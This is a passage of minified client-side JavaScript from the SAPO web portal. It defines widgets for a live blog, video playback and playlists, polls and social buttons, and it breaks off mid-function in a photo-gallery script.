t=e,i=Ink.s("["+d.selectors.trigger+"]",t);i&&(e=i),n.on(e,"click",(function(){c(t,e,null,"link")}))}))}()},show:c,hide:u}})),Ink.requireModules(["SAPO.SocialButtons_1"],(function(e){"use strict";window.SocialButtons=e,e.init()})),Ink.createModule("SAPO.Widget",1,["Ink.Dom.Css_1","Ink.Dom.Event_1","Ink.Util.Array_1","SAPO.Utils_1"],(function(e,t,n,i){"use strict";function o(e){return e?e.toString().trim():""}function r(e){return"["+m.selectors.widget+"-"+m.selectors.view+'="'+e+'"]'}function a(e,t,i,o){var r,a,s="name",l="value",c=t.nextElementSibling;c&&c.ink&&(c.ink.alias&&(c.ink.alias.name&&(s=c.ink.alias.name),c.ink.alias.value&&(l=c.ink.alias.value)),c.ink.datalist&&n.each(c.ink.datalist,(function(e){(function(e,t){return m.isIE?e.replace(/ +?/g,"")===t.replace(/ +?/g,""):e===t})(e[s],t.value)&&(r=e[l],a=t.value)}))),a&&(o(),e(r,a,t,i))}function s(e,t){if(e){var n=e.nextElementSibling;if(n&&n.ink&&window.SAPO&&window.SAPO.Datalist&&window.SAPO.Datalist.open){e.blur();var i=e.getAttribute("placeholder")||m.placeholder;window.SAPO.Datalist.open(n.ink.datalist,n.ink.alias,(function(n,i){t(n,i),e.value=i}),i)}}}function l(e,t,n){return"<option "+(t.disabled?"disabled ":"")+(t.selected?"selected ":"")+(e?"":'value="'+t[n&&n.value||"value"]+'"')+">"+t[n&&n.name||"name"]+"</option>"}function c(e,t){var n=m.selectors.widget+"-"+m.selectors.params,i=e.getAttribute(n),r={};for(var a in t)r[a]=t[a];if(i){var s=i.split(",");s&&s.forEach((function(e){var t=e.split(":");t&&t.length&&(r[o(t[0])]=o(t[1]))}))}return e.removeAttribute(n),r}function u(e){var t={},i=m.selectors.widget+"-"+m.selectors.template;return n.each(e.querySelectorAll("["+i+"]"),(function(e){var n=e.getAttribute(i);e.removeAttribute(i),t[n]={slot:e.parentElement,html:e.outerHTML},e.outerHTML=""})),t}function d(e,t,o,a,s){var l=e.querySelectorAll(r(a));l&&n.each(l,(function(e){(s&&(a=s[a]),t&&t[a])?i.includes(t[a],",")?n.each(t[a].split(","),(function(t){e.setAttribute(t.replace(" ",""),o[a])})):e.setAttribute(t[a],o[a]):e.innerHTML=o[a]}))}function h(e,t,i,o,r,a){if(e.ink.templates&&e.ink.templates[t]){var s=e.ink.templates[t].slot;if(s){var l=document.createDocumentFragment();e.ink.templates[t].html&&n.each(i,(function(n){var i=document.createElement("div");for(var a in i.innerHTML=e.ink.templates[t].html,n)d(i,o,n,a),r&&r[a]&&d(i,o,n,a,r);l.appendChild(i.firstChild),i=null})),a||(s.innerHTML=""),s.appendChild(l)}}}function p(t){return t.getView=function(e,n){var i=t.querySelector(r(e));return i&&n&&n(i),f(i,t)},t.getViews=function(e,i){var o=[];return n.each(t.querySelectorAll(r(e))||[],(function(e){o.push(f(e,t)),e&&i&&i(e)})),o},t.setLoading=function(n,i){e.setClassName(i||t,m.loading,0!=n)},t.setHidden=function(n,o){var r="boolean"!=typeof n&&i.isset(n)?"string"==typeof n?t.getView(n).getElement():n.getElement?n.getElement():n:t;r&&e.setClassName(r,"hide-all",0!=("boolean"==typeof n?n:o))},t.getTemplate=function(e){return{addData:function(n,i,o){h(t,e,n,i,o,!0)},setData:function(n,i,o){h(t,e,n,i,o)}}},t}function f(e,i){return{setLink:function(t,n){e&&(t&&e.setAttribute("href",t),n&&e.setAttribute("target",n))},setTitle:function(t,n){e&&t&&(e.setAttribute("title",t),e.setAttribute("alt",n||t))},setAttr:function(t,n){e&&e.setAttribute(t,n)},setContent:function(t){e&&(e.innerHTML=t)},setSource:function(t){e&&(e.src=t)},setText:function(t){e&&(e.innerText=t)},onClick:function(n){e&&t.on(e,"click",(function(i){i&&t.stopDefault(event),n(e,i)}))},onChange:function(n,i){e&&(i?function(e,n){if(m.isIOS)t.on(e,"focus",(function(){s(e,n)})),t.on(e,"click",(function(){s(e,n)}));else{var i=e.value||"",o=e.placeholder;t.on(e,"input",(function(t){e.value!=i&&e.value&&a(n,e,t,(function(){i=e.value,e.blur()}))})),t.on(e,"focus",(function(){i=e.value,e.placeholder=i,e.value=""})),t.on(e,"blur",(function(){e.placeholder=o,e.value=i}))}}(e,n):t.on(e,"change",(function(t){var i="";if(e.options){var o=Ink.s("[selected]",e);o&&o.removeAttribute("selected"),(o=e.options[e.selectedIndex||0])&&o.setAttribute("selected",!0),i=e.options[e.selectedIndex||0].text||""}n(e.value,i,e,t)})))},onSelect:function(e){this.onChange(e,!0)},on:function(n,i){n&&e&&t.on(e,n,(function(t){i(t,e)}))},off:function(n,i){n&&e&&t.off(e,n,i)},setOptions:function(t,i,o,r){if(e){var a=[];t&&n.each(t,(function(e){a.push(l(r,e,o))})),i&&n.each(i,(function(e){a.push('<optgroup label="'+e.label+'">'),n.each(e.options,(function(e){a.push(l(r,e,o))})),a.push("</optgroup>")})),e.innerHTML=a.join(""),r&&(e.ink={datalist:t||[],alias:o})}},setDatalist:function(e,t,n){this.setOptions(e,t,n,!0)},setDisabled:function(t){e&&(t?e.setAttribute("disabled","true"):e.removeAttribute("disabled"))},setValue:function(t){e&&(e.value=t||"")},getElement:function(t){if(e)return t&&t(e),e}}}var m={debug:!1,selectors:{widget:"data-widget",view:"view",params:"params",template:"template"},loading:"loading",hide:"hide-all",isIE:i.isIE(),isIOS:i.isIOS(),placeholder:"Escolha uma opção"};return function(e,t,i){var o,r=function(e){return document.querySelectorAll("["+m.selectors.widget+'="'+e+'"]')}(e);r&&r.length&&(i?o=t:i=t,n.each(r,(function(e){e.ink={params:c(e,o),templates:u(e)},i(p(e),e.ink.params,e.ink.templates)})))}})),Ink.requireModules(["SAPO.Widget_1"],(function(e){"use strict";window.SAPO||(window.SAPO={}),window.SAPO.Widget||(window.SAPO.Widget=e)})),Ink.createModule("SAPO.Widgets.LiveBlog",1,["Ink.Dom.Css_1","Ink.Dom.Browser_1","Ink.Dom.Element_1","Ink.Dom.Event_1","Ink.Net.JsonP_1","Ink.Util.Array_1","Ink.Util.Date_1","SAPO.Utils_1","SAPO.Widget_1"],(function(e,t,n,i,o,r,a,s,l){"use strict";function c(e,t){new o(m.api.replace("{{liveId}}",e)+"&rnd_seed="+(new Date).getTime(),{onSuccess:function(e){t&&t(e)},onFailure:function(e){console.log(e)},randVar:"",internalCallback:"live"})}function u(e,t){e&&m.scripts[e]&&g.body&&setTimeout((function(){var n=document.createElement("script");for(var i in n.setAttribute("type","text/javascript"),n.setAttribute("src",m.scripts[e]),t)n.setAttribute(i,t[i]);g.body.appendChild(n),delete m.scripts[e]}),50)}function d(e){return e?'<div class="video"><iframe data-src="https://rd.videos.sapo.pt/playhtml?file='+e.replace("//videos.sapo.pt","//rd.videos.sapo.pt")+'/mov/1&relatedVideos=none" frameborder="0" scrolling="no" width="100%" height="100%" webkitallowfullscreen mozallowfullscreen allowfullscreen></iframe></div>':""}function h(e){var t,n,i={ano:31536e6,"m&ecirc;s":2592e6,semana:6048e5,dia:864e5,hora:36e5,minuto:6e4},o=new Date-e;if(o<=i.minuto)return"mesmo agora";for(var r in i)if(0!==(t=Math.floor(o/i[r]))){n=r;break}return"h&aacute; "+t+" "+function(e,t,n){return t&&1!==n&&(e=t),e}(n,"m&ecirc;s"===n?"meses":n+"s",t)}function p(e,t){if(e){var n="string"==typeof e?e:e.getAttribute("href");if(n){var i=Ink.s(n);if(i){var o=i.getBoundingClientRect(),r={left:0,top:(g.html.scrollTop=g.html.scrollTop+o.top-85)||0};t&&(r.behavior="smooth"),g.html.scrollTo?g.html.scrollTo(r):g.html.scrollTop=r.top,s.setHash(n)}}}}function f(e){return(!("onscroll"in window)||n.inViewport(e,{partial:!0,margin:200}))&&"none"!==window.getComputedStyle(e).display&&"hidden"!==window.getComputedStyle(e).visibility}var m={name:"liveblog",id:"liveblog-event-",style:"https://liveblogging.sapo.pt/v3/assets/{{randUID}}/static/live/css/liveblog.css",api:"https://liveblogging.sapo.pt/v3/services/live/jsonp?liveId={{liveId}}",scripts:{twitter:"//platform.twitter.com/widgets.js",instagram:"//platform.instagram.com/en_US/embeds.js",pinterest:"//assets.pinterest.com/js/pinit.js"},lazy:{iframe:{selector:"i",source:"data-src",attr:"src"},social:{selector:"blockquote",source:"data-lazy-social",attr:"class"}},interval:6e4,limit:250,margin:10},g={};return["html","body"].forEach((function(e){g[e]=Ink.s(e)})),l(m.name,m.params,(function(o,l){function v(){O.throttle&&clearTimeout(O.throttle),O.throttle=setTimeout((function(){var t=Ink.ss('[data-widget-view="body"]:not(.loaded)',o);return!t||t&&!t.length?void i.off(window,"scroll",v):(t&&r.each(t,(function(t){if(f(t)){for(var n in m.lazy){var i=Ink.ss("["+m.lazy[n].source+"]",t);i&&r.each(i,(function(e){var t=e.getAttribute(m.lazy[n].source);t&&e.setAttribute(m.lazy[n].attr,t),e.removeAttribute(m.lazy[n].source)}))}e.addClassName(t,"loaded")}})),Ink.s(".twitter-tweet",o)&&(window.twttr?twttr.widgets.load():u("twitter",{id:"twitter-wjs"})),void(Ink.s(".instagram-media",o)&&(window.instgrm?instgrm.Embeds.process():u("instagram"))))}),150),!l.finished&&l.fetched&&l.ready&&o.getView("update",(function(e){!l.finished&&l.fetched&&l.ready&&n.inViewport(e,{partial:!0,margin:250})&&(l.fetched=!1,l.finished||(i.off(window,"scroll",v),w(!0),l.fetched=!0,i.on(window,"scroll",v)))}))}function y(){var e=Ink.i(m.id+"0");if(e){var t=e.getBoundingClientRect();t&&t.top>=0&&_()}}function _(){i.off(window,"scroll",y),l.limit=m.limit,l.updated=0,l.finished=!1,o.setHidden("update",!1),o.setHidden("updated"),k(),I(),p("#"+m.id+"0")}function b(){o.getView("triggers",(function(e){r.each(Ink.ss('a[href^="#"]',e),(function(e){i.on(e,"click",(function(t){i.stopDefault(event),p(e,!0)}))}))}))}function w(t){var n=o.getTemplate("trigger"),i=o.getTemplate("item");if(n&&i){var r=[],c=[],u=m.limit;l.updated||(l.updated=0,l.limit&&(u=l.limit));var f=location.href.replace(location.hash,"");if(A&&A.live&&A.live[l.updated]&&!l.finished)for(var y=l.updated;y<l.updated+u;y++){var _=A.live[y];if(_){"on"==_.key&&(_.target="#"+m.id+y,r.push(_)),_.date=h(a.set("Y-m-d H:i",_.date+" "+_.time));var w="";for(var k in _.image&&(w+='<img data-src="'+_.image+'"/>'),_.video&&(w=d(_.video)),_.body&&(w+=_.body),_.body=w,m.lazy)s.includes(_.body,"<"+m.lazy[k].selector)&&s.includes(_.body," "+m.lazy[k].attr+"=")&&(_.body=_.body.replace(" "+m.lazy[k].attr+"="," "+m.lazy[k].source+"="));_.item=m.id+y,s.includes(f,_.url)||(_.title='<a href="'+_.url+'">'+_.title+"</a>"),c.push(_)}}l.updated+=c.length,!t&&o.getView("events",(function(t){e.setClassName(t,"all-70",r.length)})),r.length?n[t?"addData":"setData"](r,{target:"href"},{title:"target"}):!t&&o.setHidden("resume"),i[t?"addData":"setData"](c,{item:"id"}),t||(g.html&&g.html.scrollIntoView&&b(),location.hash&&p(location.hash)),v(),l.finished||l.updated!=A.live.length||(l.finished=!0,o.setHidden("update"))}}function k(e){o.setLoading(!1),l.ready=!1,l.loaded=!0,O.loaded&&clearTimeout(O.loaded),O.loaded=setTimeout((function(){l.ready=!0,e?p(e):v()}),150)}function I(){i.off(window,"scroll",v),o.setLoading(),l.checksum&&window.postMessage({type:"LiveBlog",status:"changed"},"*"),l.checksum=A.checksum,w(),i.on(window,"scroll",v),l.fetched=!0,l.loaded&&k()}function C(){c(l.liveId,(function(e){if(e&&e.checksum!==l.checksum)if(A=e,l.checksum){var t=Ink.i(m.id+"1");if(g.updated&&t){var n=t.getBoundingClientRect();n&&n.top<0?(i.on(window,"scroll",y),o.setHidden("updated",!1)):_()}}else I()}))}function x(){l.scrolling&&clearTimeout(l.scrolling),l.scrolling=setTimeout((function(){o.getView("items",(function(e){var t;r.each(Ink.ss('[id^="'+m.id+'"]',e),(function(e){if(!t&&n.inViewport(e,{partial:!0,margin:-200})){var i=e.getAttribute("id");return l.visible!=i&&s.setHash(i),l.visible=i,void(t=!0)}}))}))}),100)}function S(e){E(),O.interval=setInterval(C,e||m.interval)}function E(){O.interval&&clearInterval(O.interval),O.interval=null}function T(){var e;location&&location.hash&&(o.setLoading(),e=location.hash),i.on(window,"scroll",x),l.fetched&&k(e),i.off(window,"load",T)}var A,O={};o.init=function(){t.IE&&(parseFloat(t.version,10)<9&&e.addClassName(o,"oldie"),e.addClassName(o,"ie")),g.updated=o.getView("updated"),g.updated&&g.updated.onClick(_),i.on(window,"load",T),function(e){if(!m.styled&&e&&g.body){var t=document.createElement("link");t.setAttribute("rel","stylesheet"),t.setAttribute("href",m.style.replace("{{randUID}}",e)),g.body.appendChild(t),m.styled=!0}}(l.randUID||"randUID"),u("pinterest"),C(),S(),k(location&&location.hash||"");var n=m.limit;location.hash&&s.includes(location.hash,m.id)&&((n=parseInt(parseInt(location.hash.replace("#"+m.id,""))+m.margin))<m.limit&&(n=m.limit)),l.limit=n,window.SAPO&&window.SAPO.Widgets&&window.SAPO.Widgets.LiveBlog&&(window.SAPO.Widgets.LiveBlog.start=S,window.SAPO.Widgets.LiveBlog.stop=E)}})),{}})),Ink.requireModules(["SAPO.Widgets.LiveBlog_1"],(function(e){"use strict";window.SAPO||(window.SAPO={}),window.SAPO.Widgets||(window.SAPO.Widgets={}),window.SAPO.Widgets.LiveBlog=e})),Ink.createModule("SAPO.VideoPlayer",1,["SAPO.Utils_1"],(function(e){"use strict";function t(e,t,i,o,r,l){c[e]&&s(e),u[e]=r||{},c[e]=new window.SapoPlayer(i,t,{displaytitle:l||!1,skipSuggestions:!0,onReady:function(t){o&&o(c[e]),n("on",e),document.querySelector(".main-video-ctn.loading").classList.remove("loading"),t.play(),r&&r.ready&&r.ready()}}),c[e].name=e,c[e].randname=a(t)}function n(e,t){if(t&&e&&c[t]&&u[t])for(var n in u[t])c[t][e]&&c[t][e](n,u[t][n])}function i(e,t){try{return c[e]&&c[e][t]&&c[e][t]()}catch(e){return}}function o(e){for(var t in c)e!=t&&i(t,"pause")}function r(e){return l.link.replace("{{randname}}",e)}function a(e){var t="";return e&&e.replace(/\/\/(.*)\/(\w{20})(?:\/mov\/(\d+))?/,(function(e,n,i,o){t=i})),t}function s(e){var t;if(e&&("string"==typeof e&&(e=c[t=e]),e)){t||(t=e.name),n("off",t);try{e.pause&&e.pause()}catch(e){l.debug&&console.error(e)}try{e.stop&&e.stop()}catch(e){l.debug&&console.error(e)}try{e.unload&&e.unload()}catch(e){l.debug&&console.error(e)}}}var l={debug:!1,link:"https://rd.videos.sapo.pt/{{randname}}/mov",player:"https://js.sapo.pt/Projects/SAPOPlayer/latest/SapoPlayer.js",loaded:!1,autoplay:!(/(iPhone|iPod|iPad)/i.test(window.navigator.userAgent)&&!/(Linux)/i.test(window.navigator.userAgent)||-1!=window.navigator.userAgent.indexOf("Safari")&&-1==window.navigator.userAgent.indexOf("Chrome"))},c={},u={};return{play:function(n,i,o,a,s,c){var u=r(i);l.ready?t(n,u,o,a,s,c):(l.loaded=!1,!l.loaded&&e.loadAsync(l.player,(function(){t(n,u,o,a,s,c),l.ready=!0,l.loaded=!0})))},pause:o,stop:function(e){for(var t in o(e),c)e!=t&&i(t,"stop")},playing:function(e){if(e){if(i(e,"isPlaying"))return!0}else for(var t in c)if(i(t,"isPlaying"))return!0;return!1},link:r,randname:a,reset:s,analytics:function(e,t,n){e&&t&&HP&&HP.Kpis&&HP.Kpis.registerExternalKpi&&HP.Kpis.registerExternalKpi({zone:e,title:n||"",url:t,event:"message",type:"content",frequency:"dynamic"})},autoplay:l.autoplay}})),Ink.requireModules(["SAPO.VideoPlayer_1"],(function(e){"use strict";window.SAPO||(window.SAPO={}),window.SAPO.VideoPlayer=e})),Ink.createModule("SAPO.Widgets.VHS",1,["Ink.Dom.Css_1","Ink.Dom.Element_1","Ink.Dom.Event_1","Ink.Net.JsonP_1","Ink.Util.Array_1","Ink.Util.Cookie_1","SAPO.Utils_1","SAPO.VideoPlayer_1","SAPO.Widget_1"],(function(e,t,n,i,o,r,a,s,l){"use strict";function c(e){return a.getThumbnail({src:u.url+e+"/pic/320x240",width:320,height:180,crop:"center",tv:1})}var u={name:"vhs",debug:!1,selector:"data-vhs",redirect:!1,group:"data-vhs-group",title:"data-vhs-video-title",duration:"data-vhs-video-duration",widget:"data-widget",playlist:"data-vhs-playlist-title",head:"Playlist",cookie:"_shp_vhs_autoplay",hash:"vhs-",video:"/video/",randname:20,url:"http://videos.sapo.pt/",related:"https://services.sapo.pt/Videos/JSON2/Query/?limit=10&thumbsize=560x420&related=",css:{single:"vhs--single-video",playlist:"vhs--playlist",preventScroll:"has-active-modal",current:"current",smooth:"vhs-ctn--open-smooth",vhs:"vhs-ctn--open",thumb:"vhs-opening",opening:"vhs-opening--anim"},params:{autoplay:!0},timers:{delay:2e3,track:3e5},opened:0,speed:5,animation:{enabled:!1,properties:["top","left","width","height"]},closable:["main-video-ctn","vhs-ctn--open","vhs"]},d=Ink.s("body");return d&&d.getBoundingClientRect&&(u.animation.enabled=!0),l(u.name,u.params,(function(l,h){function p(e){e&&"Escape"===e.key&&m()}function f(){try{L&&L.mute&&L.mute()}catch(e){u.debug&&console.error(e)}}function m(){y(),h.status=!1,S(),x(),l.getView("container",(function(t){e.removeClassName(t,u.css.single),e.removeClassName(t,u.css.playlist)})),delete h.video,delete h.related,delete h.playlist,a.setHash(),e.removeClassName(d,u.css.preventScroll),n.off(window,"keyup",p),l.getView("playlist-ctn",(function(t){t.scrollTop=0,e.removeClassName(t,"loading")})),F.anim&&clearInterval(F.anim),F.track&&clearInterval(F.track),F={},O("close",L&&L.randname||""),u.opened&&u.opened--,U&&t.remove(U),e.removeClassName(l,u.css.vhs),e.removeClassName(l,u.css.smooth),l.setHidden(),R=!0}function g(t){h.current&&e.removeClassName(h.current,u.css.current),t&&(h.current=Ink.s("["+u.selector+'="'+t+'"]',l),h.current||(h.current=Ink.s("["+u.selector+'="'+u.url+t+'"]',l)),h.current&&e.addClassName(h.current,u.css.current))}function v(e){var t=(h.playlist||[]).indexOf(e);return(t>-1?t+"-":"")+e}function y(){f(),F.ready&&clearTimeout(F.ready),s.reset(u.name)}function _(){return h&&h.status&&L.randname==L.getVideoRandname()&&!L.isPlaying()&&L.getCurrentRequestURL()==L.getVideoUrl()}function b(){R=!0,h&&!h.status&&(f(),s.reset(u.name))}function w(e,n){if(_()){if(a.setHash(u.hash+L.randname),l.setLoading(!1),l.setLoading(!1,e),n&&(n.style.opacity=1),U&&t.remove(U),s.autoplay)try{L&&L.play&&L.play()}catch(e){u.debug&&console.error(e)}g(L.randname)}}function k(t,i,o,r){n.on(window,"keyup",p),t&&(L&&L.randname==t&&h.status?L.setCurrentTime(0):l.getView("player",(function(n){y(),h.current&&e.removeClassName(h.current,u.css.current),window.vc&&window.vc.pause&&window.vc.pause(),s.pause(),g(t),l.getView("wrapper",(function(a){l.setLoading(!0,a);var d=n.firstChild;d&&(d.style.opacity=0),!o&&e.addClassName(l,u.css.smooth),e.addClassName(l,u.css.vhs),setTimeout((function(){h&&h.status&&(r&&(h.current&&h.current.focus&&h.current.focus(),l.getView("close",(function(e){e.focus&&e.focus()}))),s.play(u.name,t,n,(function(e){L=e,window.p=L}),{play:b,adPlay:b,ready:function(){_()&&(w(a,d),F.ready&&clearTimeout(F.ready),F.ready=setTimeout((function(){R=!0,h&&!h.status&&y()}),0))},playProgress:function(){R=!0},adPlayProgress:function(){R=!0},adTime:function(){R=!0},time:function(){R=!0},ended:function(){if(R=!0,h&&h.autoplay&&h.playlist){var e=h.playlist.indexOf(L.randname);if(e>-1){var t=h.playlist[e+1];t&&(O("auto-play",v(L.randname)),k(t))}}},metadata:function(e,t){if(h&&h.single){var n=parseInt(t["sapo:time"]||0),i=n?Math.floor(n/60):0;1==(n=n-60*i+"").length&&(n="0"+n),E({title:t.title,randname:L.randname,link:t.guid,thumb:c(L.randname),duration:i+":"+(n||"00")||""})}}},!0))}),i?u.timers.delay:0)})),e.addClassName(d,u.css.preventScroll),h.status=!0})))}function I(e,t){var n=l.getTemplate(e);n&&n.setData(t,{link:"href,"+u.selector,thumb:"src"})}function C(e){h.playlist=e?e.map((function(e){return e&&e.randname||""})):[]}function x(e){I("pivot",e?[e]:[])}function S(t){I("playlist",t||[]),t&&l.getView("playlist-ctn",(function(t){e.removeClassName(t,"loading")}))}function E(e){e&&!h.video&&(h.video=e,x(e),C([e].concat(h.related)))}function T(e){h.related=[],e&&new i(u.related+e,{onSuccess:function(t){t&&t.rss&&t.rss.channel&&t.rss.channel.item&&t.rss.channel.item.forEach((function(e){var t=s.randname(e.link);for(e.randname=t,e.thumb=c(t),e.duration=e["sapo:time"];("0"===e.duration.charAt(0)||":"===e.duration.charAt(0))&&e.duration.length>4;)e.duration=e.duration.substr(1);h.related.push(e)})),S(h.related),E(),g(e)},onFailure:function(e){u.debug&&console.error(e)}})}function A(t,n){var i=t?Ink.ss("["+u.selector+"]",t):[];if(h.single=!(i&&i.length),l.getView("container",(function(t){e.addClassName(t,h.single?u.css.single:u.css.playlist)})),h.single)T(n);else{var r=[],a={};o.each(i,(function(e){var t=e.getAttribute(u.selector),n=e.getAttribute(u.title),i=e.getAttribute(u.duration);t&&(t.length>u.randname&&(t=s.randname(t)),t&&!a[t]&&(a[t]=!0,r.push({randname:t,title:n,duration:i,link:u.url+t,thumb:c(t)})))})),S(r),C(r);var d=l.getView("title");d&&d.setContent(t.getAttribute(u.playlist)||u.head)}}function O(e,t,n){a.trackGTMEvent("VHS-v3",(h.single?"related":"playlist")+"-"+e+(t?"-"+t:"")+(n?"-"+n:""),window.location.pathname)}function D(t,n,i,o,r){l.setHidden(!1),l.getView("playlist-ctn",(function(t){e.addClassName(t,"loading")})),u.opened++;var a=!r&&o&&u.animation.enabled;a&&function(t){if(t&&d){var n={start:t.getBoundingClientRect(),properties:{}};U=document.createElement("div"),u.animation.properties.forEach((function(e){U.style[e]=parseInt(n.start[e])+"px"})),e.addClassName(U,u.css.thumb),d.appendChild(U),setTimeout((function(){e.addClassName(U,u.css.opening),l.getView("player",(function(e){n.end=e.getBoundingClientRect(),u.animation.properties.forEach((function(e){U.style[e]=parseInt(n.end[e])+"px"}))}))}),0)}}(o),A(n,t),O(i,r||h.single?t:v(t)),k(t,a,r,!0)}function P(t,n){h.autoplay=n,e.setClassName(t,"on",h.autoplay),r.set(u.cookie,h.autoplay+"")}function N(t){var n=!1;return t&&o.each(u.closable,(function(i){e.hasClassName(t,i)&&(n=!0)})),n}function M(){d&&n.observe(d,"click",(function(t){var i,o,r,l,c=!0;if(t){if(N(t.target))return n.stopDefault(event),void m();a.parents(t,(function(t){t&&t.hasAttribute&&c&&(t.hasAttribute(u.widget)&&t.getAttribute(u.widget)!=u.name&&(c=!1),t.hasAttribute(u.selector)&&(o=t.getAttribute(u.selector),l=t),h.status||(e.hasClassName(t,"thumb")&&(r=t),!i&&t.hasAttribute(u.group)&&(i=t)))})),o&&c&&(n.stopDefault(event),!r&&l&&(r=Ink.s(".thumb",l)),o.length>u.randname&&(o=s.randname(o)),o&&R&&(h.status?function(e){O("click-play",v(e)),k(e)}(o):D(o,i,"click-open",r)),R=!1,setTimeout((function(){R=!0}),500))}}));var t=l.getView("close");t&&t.onClick(m);var i=l.getView("autoplay",(function(e){P(e,!r.get(u.cookie)||"true"==r.get(u.cookie))}));i&&i.onClick((function(e){P(e,!h.autoplay),O("click-autoplay",h.autoplay?"on":"off")}))}var L,U,R=!0,F={};!function(){if(M(),location.hash&&a.includes(location.hash,u.hash)){var e=location.hash.replace("#"+u.hash,"");e&&e.length==u.randname&&(u.redirect?location=u.video+e:D(e,null,"auto-open",null,!0))}l.setLoading(!1)}()})),{isOpen:function(){return!!u.opened}}})),Ink.requireModules(["SAPO.Widgets.VHS_1"],(function(e){"use strict";window.SAPO||(window.SAPO={}),window.SAPO.Widgets||(window.SAPO.Widgets={}),window.SAPO.Widgets.VHS=e})),Ink.createModule("SAPO.Widgets.Poll",1,["Ink.Dom.Css_1","Ink.Net.Ajax_1","Ink.Net.JsonP_1","Ink.Dom.Event_1","Ink.Util.Array_1","Ink.Util.Date_1","SAPO.Widget_1"],(function(e,t,n,i,o,r,a){"use strict";var s,l={name:"poll",sponsor:"data-sponsor-tracker",api:"//vota.sapo.pt/polljson.php",storage:"_shp_poll_{{vsite}}_votes",date:"d \\d\\e F \\d\\e Y",views:["poll","results","polls"],error:"Ocorreu um erro. Tente novamente mais tarde."};return a(l.name,(function(e,a){function c(t){switch("poll"==t&&a.answered&&(t="results"),o.each(l.views,(function(n){e.setHidden(n,n!=t),e.setHidden(g[n],n==t)})),e.setHidden("question","polls"==t),t){case"poll":(function(){var t=[];a.answers&&o.each(a.answers,(function(e){t.push('<label for="poll-'+e.id+'"><input type="radio" id="poll-'+e.id+'" name="answer" data-widget-view="answer" value="'+e.id+'"/>'+e.answer+"</label>")})),e.getView("questions").setContent(t.join(""));var n=e.getViews("answer"),i=e.getView("vote");i&&i.setDisabled(!0),n&&o.each(n,(function(e){e.onChange((function(e){i&&i.setDisabled(!1),a.answer=e}))})),e.getView("id").setValue(a.poll)})(),e.setHidden("question","polls"==t),e.setHidden(g.polls,!1),e.setHidden(g.results,!1);break;case"results":(function(){var t=[];e.setHidden("answered",!a.answered),a.answers&&o.each(a.answers,(function(e){t.push('<p class="answer">'+e.answer+': <span class="votes">'+e.votes+"</span></p>");var n=(Math.round(100/a.total*e.votes)||0)+"%";t.push('<div class="percentage" style="width: '+n+';">'+n+"</div>")})),e.getView("answers").setContent(t.join(""))})(),e.setHidden(g.polls,!a.answered),e.setHidden(g.poll,!!a.answered);break;case"polls":!a.polls&&m({op:"last"},(function(e){e&&u(e.polls)})),e.setHidden(g.results),e.setHidden(g.poll,!1)}a.ready||(e.setLoading(!1),a.ready=!0)}function u(t){if(t){var n=[];o.each(t,(function(e){var t=r.get(l.date,[e.beginDate.slice(0,4),e.beginDate.slice(4,6),e.beginDate.slice(6,8)].join("-"));n.push('<p class="question"><span class="date">'+t+'</span><a data-widget-view="question" id="'+e.id+'">'+e.question+"</a></p>")})),e.getView("polls").setContent(n.join("")),e.getViews("question",(function(e){i.on(e,"click",(function(){var t=e.getAttribute("id");t&&h(t),c(l.name)}))})),a.polls=!0}}function d(t,n){if(t){e.getView("question").setContent(t.title),a.poll=n;var i=e.getView("info");e.setHidden(i,!t.newsLink),i&&i.setLink(t.newsLink),a.answered=s[n.toString()],a.total=t.total,a.answers=t.answers}c(l.name)}function h(t){e.getView("answers").setContent(""),e.getView("questions").setContent(""),m({op:t,id:t},(function(e){e&&d(e,t)}))}function p(){m({answer:a.answer,id:a.poll,op:"vote"},(function(){a.answered=!0,s[a.poll.toString()]=!0,localStorage.setItem(l.storage,JSON.stringify(s)),c("results")}))}function f(){var e=Ink.s("["+l.sponsor+"]");if(e){var n=e.getAttribute(l.sponsor);n&&new t(n,{method:"GET",cors:!0,onSuccess:function(e){console.log("poll","onSuccess",e)},onFailure:function(e){console.log("poll","onFailure",e)}})}}function m(e,t){e||(e={}),e.vsite=a.vsite,new n(l.api,{onSuccess:function(e){t(e)},onFailure:function(e){console.error("Widgets.Poll",e),t()},params:e})}var g={};e.init=function(){l.storage=l.storage.replace("{{vsite}}",a.vsite),s=JSON.parse(localStorage.getItem(l.storage)||"{}");var t=e.getView("vote");t&&(t.onClick(p),t.setDisabled(!0)),o.each(l.views,(function(t){g[t]=e.getView(t+"-btn"),g[t].onClick((function(){c(t)}))})),m({op:"last"},(function(e){e&&e.polls&&e.polls.length&&h(e.polls[0].id)})),f()}})),{}})),Ink.requireModules(["SAPO.Widgets.Poll_1"],(function(e){"use strict";window.SAPO||(window.SAPO={}),window.SAPO.Widgets||(window.SAPO.Widgets={}),window.SAPO.Widgets.Poll=e})),Ink.requireModules(["Ink.Dom.Event_1","Ink.Dom.Css_1","Ink.Util.Array_1","Ink.Util.Url_1","Ink.Net.Ajax_1","SAPO.Utils_1","Ink.Dom.Element_1"],(function(e,t,n,i,o,r,a){"use strict";var s;void 0!==window.dataLayer&&window.dataLayer.forEach((function(e){void 0!==e.page_type&&(s=e.page_type)}));var l="";Ink.s(".pswp-ad")&&(l=Ink.s(".pswp-ad").getAttribute("data-pub-target")||"");var c=document.title,u=0,d=!1,h={},p=!1,f=!1,m=!0;!function(){var e=new Image;e.onload=function(){f=e.width>0&&e.height>0},e.onerror=function(){f=!1},e.src="data:image/webp;base64,UklGRiIAAABXRUJQVlA4IBYAAAAwAQCdASoBAAEADsD+JaQAA3AAAAAA"}();for(var g=function(e){var n=Ink.s(".pswp-related-articles .close"),i=Ink.s(".pswp-related-articles"),o=e.target;n!=o&&!n.contains(o)&&i.contains(o)||(t.removeClassName(Ink.s(".pswp-ctn"),"show-related-articles"),document.removeEventListener("click",g))},v=function(e){/(27|39|37)/.test(e.keyCode)&&(t.removeClassName(Ink.s(".pswp-ctn"),"show-related-articles"),document.removeEventListener("keydown",v))},y=function(n,y){function _(n,i,o,a){var y,_,w=Ink.s(".pswp");E(),x(i,(function(o){if((_={galleryUID:i.getAttribute("data-pswp-uid"),clickToCloseNonZoomable:!1}).getThumbBoundsFn=function(e){if(o[e].html)return!1;var t=i,n=window.pageYOffset||document.documentElement.scrollTop,r=t.getBoundingClientRect();return{x:r.left,y:r.top+n,w:r.width}},a)if(_.galleryPIDs){for(var x=0;x<o.length;x++)if(o[x].pid===n){_.index=x;break}}else _.index=parseInt(n,10)-1;else 